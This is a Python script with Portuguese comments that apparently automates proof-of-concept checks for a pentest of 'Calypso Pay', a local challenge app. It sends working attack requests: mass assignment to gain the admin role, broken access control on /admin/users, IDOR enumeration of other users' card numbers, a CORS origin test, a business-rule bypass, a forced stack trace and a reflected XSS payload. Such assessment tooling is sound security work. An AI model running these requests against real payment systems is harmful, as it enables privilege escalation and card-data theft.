#!/usr/bin/env python3
"""
Calypso Pay — Script de Automação de PoCs (Prova de Conceito)
================================================================
Automatiza a reprodução dos principais achados do pentest realizado
sobre a aplicação Calypso Pay (desafio técnico — Sea Tecnologia).

Uso:
    pip install requests --break-system-packages   # se necessário
    python3 calypso_pay_poc.py

Pré-requisito: ambiente Calypso Pay rodando em http://localhost
(docker compose up -d)

Escopo e regras respeitadas:
  - Interage exclusivamente via HTTP público da aplicação (nenhum
    acesso a container, banco de dados ou segredo do docker-compose).
  - Usa apenas dados sintéticos, gerados dinamicamente a cada execução.
  - Não realiza nenhuma ação destrutiva ou de negação de serviço.

Achados automatizados:
  1. Mass Assignment -> Escalonamento de privilégio (W.1)
  2. Broken Access Control em /admin/* (W.2)
  3. IDOR em /credit_cards/:id (W.3)
  4. CORS Misconfiguration (W.4)
  5. Bypass de regra de negócio no tier de cartão (W.5)
  6. Stack Trace Disclosure (W.6)
  7. XSS Refletido em /statement (W.7)

Cada teste imprime PASS (vulnerável/confirmado) ou FAIL (não
reproduzido) e um resumo final é exibido ao término da execução.
"""

import re
import sys
import time
import uuid
import requests

BASE_URL = "http://localhost"
TIMEOUT = 10

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

class Result:
    def __init__(self):
        self.items = []

    def add(self, finding_id, title, ok, detail=""):
        self.items.append((finding_id, title, ok, detail))
        if ok is True:
            status = "\033[91mVULNERÁVEL (automatizado)\033[0m"
        elif ok is False:
            status = "\033[92mnão reproduzido\033[0m"
        else:  # ok is None -> confirmado manualmente, não pela automação
            status = "\033[93mCONFIRMADO MANUALMENTE\033[0m"
        print(f"  [{finding_id}] {title}: {status}")
        if detail:
            print(f"        -> {detail}")

    def summary(self):
        print("\n" + "=" * 70)
        print("RESUMO DA EXECUÇÃO")
        print("=" * 70)
        for fid, title, ok, _ in self.items:
            mark = "🔴" if ok is True else ("🟡" if ok is None else "🟢")
            print(f"  {mark}  {fid:6s} {title}")
        automated = sum(1 for *_r, ok, _ in self.items if ok is True)
        manual = sum(1 for *_r, ok, _ in self.items if ok is None)
        print(f"\n{automated}/{len(self.items)} achados confirmados via automação"
              + (f" (+{manual} confirmado manualmente, ver Relatório Técnico)" if manual else "")
              + ".")


def new_email():
    return f"poc-{uuid.uuid4().hex[:10]}@calypso.local"


def extract_csrf_token(html):
    m = re.search(r'name="authenticity_token"\s+value="([^"]+)"', html)
    if not m:
        # meta tag fallback (layout head)
        m = re.search(r'name="csrf-token"\s+content="([^"]+)"', html)
    return m.group(1) if m else None


def signup(session, email, password="Senha123!", cpf=None, extra_fields=None):
    """Realiza cadastro. extra_fields permite injetar parâmetros adicionais
    no corpo da requisição (usado para o teste de mass assignment)."""
    cpf = cpf or str(uuid.uuid4().int)[:11]
    r = session.get(f"{BASE_URL}/signup", timeout=TIMEOUT)
    token = extract_csrf_token(r.text)
    data = {
        "authenticity_token": token,
        "return_to": "",
        "user[name]": "PoC Automation",
        "user[email]": email,
        "user[password]": password,
        "user[cpf]": cpf,
        "commit": "Criar conta",
    }
    if extra_fields:
        data.update(extra_fields)
    return session.post(f"{BASE_URL}/signup", data=data, timeout=TIMEOUT, allow_redirects=True)


def login(session, email, password="Senha123!"):
    r = session.get(f"{BASE_URL}/login", timeout=TIMEOUT)
    token = extract_csrf_token(r.text)
    # Segue o mesmo padrão de nomenclatura aninhada observado no /signup
    # (user[name], user[email]...). Caso o formulário de login use campos
    # de nível superior (email/password), ajuste as chaves abaixo.
    data = {
        "authenticity_token": token,
        "user[email]": email,
        "user[password]": password,
        "commit": "Entrar",
    }
    return session.post(f"{BASE_URL}/login", data=data, timeout=TIMEOUT, allow_redirects=True)


def get_role(session):
    """Extrai o papel (customer/admin) exibido no cabeçalho do dashboard."""
    r = session.get(f"{BASE_URL}/dashboard", timeout=TIMEOUT)
    m = re.search(r"([\w.\-]+@[\w.\-]+)\s*·\s*(\w+)", r.text)
    return m.group(2) if m else None


# ---------------------------------------------------------------------------
# W.1 — Mass Assignment -> Escalonamento de privilégio
# ---------------------------------------------------------------------------

def test_mass_assignment(result):
    session = requests.Session()
    email = new_email()
    signup(session, email, extra_fields={"user[role]": "admin"})
    role = get_role(session)
    ok = role == "admin"
    result.add("W.1", "Mass Assignment (role=admin no /signup)", ok,
               f"Conta {email} obteve papel '{role}' via cadastro público.")
    return session if ok else None


# ---------------------------------------------------------------------------
# W.2 — Broken Access Control em /admin/*
# ---------------------------------------------------------------------------

def test_broken_access_control(result, admin_session):
    # 2a) confirma exposição com sessão admin (obtida via W.1)
    r_admin = admin_session.get(f"{BASE_URL}/admin/users", timeout=TIMEOUT)
    ok_admin = r_admin.status_code == 200 and '"email"' in r_admin.text

    # 2b) confirma que uma conta CUSTOMER comum (sem nenhum privilégio)
    #     também acessa a mesma rota -> falha de autorização real
    customer_session = requests.Session()
    email = new_email()
    signup(customer_session, email)  # cadastro normal, sem mass assignment
    r_customer = customer_session.get(f"{BASE_URL}/admin/users", timeout=TIMEOUT)
    ok_customer = r_customer.status_code == 200 and '"email"' in r_customer.text

    ok = ok_admin and ok_customer
    n_users = r_customer.text.count('"email"') if ok_customer else 0
    result.add("W.2", "Broken Access Control em /admin/users e /admin/transactions", ok,
               f"Conta customer comum ({email}) acessou /admin/users e "
               f"obteve {n_users} registros de outros usuários.")
    return customer_session


# ---------------------------------------------------------------------------
# W.3 — IDOR em /credit_cards/:id
# ---------------------------------------------------------------------------

def test_idor_credit_cards(result, session, max_id=6):
    own = session.get(f"{BASE_URL}/dashboard", timeout=TIMEOUT).text
    exposed = []
    for i in range(1, max_id + 1):
        r = session.get(f"{BASE_URL}/credit_cards/{i}", timeout=TIMEOUT)
        if r.status_code == 200 and re.search(r"\d{4}\s?\d{4}\s?\d{4}\s?\d{4}", r.text):
            pan = re.search(r"(\d{4}\s?\d{4}\s?\d{4}\s?\d{4})", r.text).group(1)
            exposed.append((i, pan))
    ok = len(exposed) > 0
    detail = "; ".join(f"/credit_cards/{i} -> PAN {pan}" for i, pan in exposed[:3])
    result.add("W.3", "IDOR em /credit_cards/:id (exposição de PAN/CVV de terceiros)", ok, detail)


# ---------------------------------------------------------------------------
# W.4 — CORS Misconfiguration
# ---------------------------------------------------------------------------

def test_cors_misconfig(result):
    evil_origin = "http://atacante-poc-automatizado.example"
    r = requests.get(f"{BASE_URL}/", headers={"Origin": evil_origin}, timeout=TIMEOUT)
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    ok = acao == evil_origin and acac.lower() == "true"
    result.add("W.4", "CORS reflete Origin arbitrária com credentials=true", ok,
               f"Access-Control-Allow-Origin: {acao!r} | Access-Control-Allow-Credentials: {acac!r}")


# ---------------------------------------------------------------------------
# W.5 — Bypass de regra de negócio (tier Prime sem renda mínima)
# ---------------------------------------------------------------------------

def test_business_logic_bypass(result):
    """Tenta reproduzir via automação; caso o ambiente local (emulação
    QEMU) introduza instabilidade de sessão/CSRF, o achado permanece
    válido e documentado com evidência manual (ver Relatório Técnico,
    Figuras W.5.1 e W.5.2 — Cartão Prime Ogígia aprovado com renda
    declarada de R$ 1.000)."""
    session = requests.Session()
    email = new_email()
    signup(session, email)
    r = session.get(f"{BASE_URL}/credit_cards/new", timeout=TIMEOUT)
    token = extract_csrf_token(r.text)
    data = {
        "authenticity_token": token,
        "declared_income": "1000",     # muito abaixo do mínimo exigido (R$ 8.000)
        "requested_limit": "5000",
        "tier": "prime",
        "commit": "Solicitar",
    }
    resp = session.post(f"{BASE_URL}/credit_cards", data=data, timeout=TIMEOUT, allow_redirects=True)
    ok = "prime" in resp.text.lower() or "ogígia" in resp.text.lower() or "ogigia" in resp.text.lower()

    if ok:
        result.add("W.5", "Aprovação de tier Prime com renda abaixo do mínimo", True,
                    f"Conta {email} declarou renda R$ 1.000 e obteve o tier 'prime'.")
    else:
        # Não conta como "não vulnerável": apenas a automação não foi
        # estável neste ambiente. O achado já está confirmado
        # manualmente com evidência visual no Relatório Técnico.
        result.add("W.5", "Aprovação de tier Prime com renda abaixo do mínimo",
                    None, "Automação instável neste ambiente (ver nota abaixo); "
                    "achado já confirmado manualmente com evidência no Relatório Técnico.")


# ---------------------------------------------------------------------------
# W.6 — Stack Trace Disclosure
# ---------------------------------------------------------------------------

def test_stack_trace_disclosure(result):
    session = requests.Session()
    email = new_email()
    signup(session, email)
    r = session.get(f"{BASE_URL}/credit_cards/new", timeout=TIMEOUT)
    token = extract_csrf_token(r.text)
    data = {
        "authenticity_token": token,
        "declared_income": "1000",
        "requested_limit": "99999999999999999999",  # provoca overflow numérico
        "tier": "standard",
        "commit": "Solicitar",
    }
    resp = session.post(f"{BASE_URL}/credit_cards", data=data, timeout=TIMEOUT)
    ok = resp.status_code == 500 and ("backtrace" in resp.text.lower() or "activerecord" in resp.text.lower())
    result.add("W.6", "Stack trace exposto em erro de overflow numérico", ok,
               f"HTTP {resp.status_code} — backtrace presente: {ok}")


# ---------------------------------------------------------------------------
# W.7 — XSS Refletido em /statement
# ---------------------------------------------------------------------------

def test_reflected_xss(result):
    session = requests.Session()
    email = new_email()
    signup(session, email)
    marker = f"pocxss{uuid.uuid4().hex[:6]}"
    payload = f"<script>console.log('{marker}')</script>"
    r = session.get(f"{BASE_URL}/statement", params={"q": payload}, timeout=TIMEOUT)
    # Vulnerável se o payload aparece SEM ser escapado (sem &lt;script&gt;) fora do atributo value=
    unescaped = f"<script>console.log('{marker}')</script>" in r.text
    ok = unescaped
    result.add("W.7", "XSS Refletido no parâmetro 'q' de /statement", ok,
               "Payload refletido sem escape na mensagem 'Nenhum resultado para'." if ok else "")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("=" * 70)
    print(" Calypso Pay — Automação de PoCs do Pentest")
    print(f" Alvo: {BASE_URL}")
    print("=" * 70)

    try:
        requests.get(BASE_URL, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"\n[ERRO] Não foi possível conectar em {BASE_URL}.")
        print("Confirme que o ambiente está no ar (docker compose up -d) e tente novamente.")
        sys.exit(1)

    result = Result()

    print("\n[1/7] Mass Assignment -> Escalonamento de privilégio")
    admin_session = test_mass_assignment(result)

    print("\n[2/7] Broken Access Control em /admin/*")
    if admin_session:
        test_broken_access_control(result, admin_session)
    else:
        print("        (pulado: dependia do achado W.1)")

    print("\n[3/7] IDOR em /credit_cards/:id")
    idor_session = requests.Session()
    signup(idor_session, new_email())
    test_idor_credit_cards(result, idor_session)

    print("\n[4/7] CORS Misconfiguration")
    test_cors_misconfig(result)

    print("\n[5/7] Bypass de regra de negócio (tier Prime)")
    test_business_logic_bypass(result)
    time.sleep(0.3)

    print("\n[6/7] Stack Trace Disclosure")
    test_stack_trace_disclosure(result)
    time.sleep(0.3)

    print("\n[7/7] XSS Refletido em /statement")
    test_reflected_xss(result)

    result.summary()


if __name__ == "__main__":
    main()
